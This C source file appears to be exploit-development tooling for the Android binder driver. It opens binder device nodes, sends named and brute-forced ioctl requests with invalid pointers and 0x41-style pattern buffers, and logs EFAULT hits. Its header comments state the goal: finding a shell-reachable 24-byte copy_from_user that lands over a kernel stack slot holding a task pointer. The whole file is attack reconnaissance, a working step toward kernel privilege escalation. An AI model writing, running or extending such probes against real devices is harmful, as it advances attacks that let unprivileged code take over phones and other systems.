/**
 * test_binder_cfu.c — find shell-reachable binder ioctl that hits 24B stack CFU
 *
 * Static [BIN]: binder_ioctl frame 0xa0, CFU 0x18 @ SP+0x10
 *   nest sys_ioctl 0x40 + do_vfs 0x90 = 0xD0
 *   abs [0x160, 0x178) covers task @ 0x168 at buffer+0x8
 */
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BINDER_IOC(dir, nr, sz)                                                \
  (((dir) << 30) | ((sz) << 16) | (('b') << 8) | (nr))

/* Common binder ioctl nrs from uapi/linux/android/binder.h */
static const struct {
  const char *name;
  unsigned long req;
} cmds[] = {
    {"WRITE_READ_32", BINDER_IOC(3, 1, 24)},
    {"WRITE_READ_48", BINDER_IOC(3, 1, 48)},
    {"WRITE_READ_32b", BINDER_IOC(3, 1, 32)},
    {"SET_IDLE_TIMEOUT", BINDER_IOC(1, 3, 8)},
    {"SET_MAX_THREADS", BINDER_IOC(1, 5, 4)},
    {"SET_IDLE_PRIORITY", BINDER_IOC(1, 6, 4)},
    {"SET_CONTEXT_MGR", BINDER_IOC(1, 7, 4)},
    {"THREAD_EXIT", BINDER_IOC(1, 8, 4)},
    {"VERSION_4", BINDER_IOC(3, 9, 4)},
    {"VERSION_8", BINDER_IOC(3, 9, 8)},
    {"GET_NODE_DEBUG_INFO", BINDER_IOC(3, 11, 24)},
    {"GET_NODE_INFO_FOR_REF", BINDER_IOC(3, 12, 24)},
    {"SET_CONTEXT_MGR_EXT", BINDER_IOC(1, 13, 24)},
    {"ENABLE_ONEWAY_SPAM", BINDER_IOC(1, 14, 4)},
    /* brute common sizes for nr 1..15 */
};

static void try_one(int fd, const char *tag, unsigned long req, void *arg) {
  errno = 0;
  int r = ioctl(fd, req, arg);
  int e = errno;
  if (e == EFAULT || e == 0 || (r == 0) || e == EINVAL || e == EPERM ||
      e == EACCES || e == ENOMEM) {
    printf("  %-28s req=%08lx ret=%d errno=%d (%s)%s\n", tag, req, r, e,
           r < 0 ? strerror(e) : "OK", e == EFAULT ? "  ← CFU" : "");
  }
}

int main(void) {
  const char *paths[] = {"/dev/binder", "/dev/hwbinder", "/dev/vndbinder",
                         NULL};
  int fd = -1;
  const char *used = NULL;
  for (int i = 0; paths[i]; i++) {
    fd = open(paths[i], O_RDWR);
    if (fd < 0)
      fd = open(paths[i], O_RDONLY);
    if (fd >= 0) {
      used = paths[i];
      break;
    }
    printf("open %s errno=%d\n", paths[i], errno);
  }
  if (fd < 0)
    return 1;
  printf("using %s fd=%d\n\n", used, fd);

  uint8_t good[64];
  memset(good, 0, sizeof(good));
  void *bad = (void *)(uintptr_t)0x8;

  printf("=== named cmds: good then bad ptr ===\n");
  for (unsigned i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
    try_one(fd, cmds[i].name, cmds[i].req, good);
    char tag[64];
    snprintf(tag, sizeof(tag), "%s bad", cmds[i].name);
    try_one(fd, tag, cmds[i].req, bad);
  }

  printf("\n=== brute nr=0..20 size=4/8/16/24/32/48 dir=WR ===\n");
  int sizes[] = {4, 8, 16, 24, 32, 48};
  for (int nr = 0; nr <= 20; nr++) {
    for (unsigned si = 0; si < sizeof(sizes) / sizeof(sizes[0]); si++) {
      int sz = sizes[si];
      unsigned long req = BINDER_IOC(3, nr, sz);
      errno = 0;
      int r = ioctl(fd, req, bad);
      int e = errno;
      if (e == EFAULT) {
        printf("  EFAULT nr=%d sz=%d req=%08lx ret=%d\n", nr, sz, req, r);
      }
    }
  }

  /* pattern buffer for residual */
  uint64_t pat[3] = {0x1111111111111111ULL, 0x4141414141414141ULL,
                     0x2222222222222222ULL};
  printf("\n=== pattern on GET_NODE_INFO_FOR_REF / DEBUG_INFO ===\n");
  try_one(fd, "NODE_INFO pattern", BINDER_IOC(3, 12, 24), pat);
  try_one(fd, "NODE_DEBUG pattern", BINDER_IOC(3, 11, 24), pat);
  try_one(fd, "WRITE_READ_24 pattern", BINDER_IOC(3, 1, 24), pat);

  close(fd);
  printf("\nStatic: task@0x168 is CFU buf+0x8 for 24B @ binder SP+0x10\n");
  return 0;
}
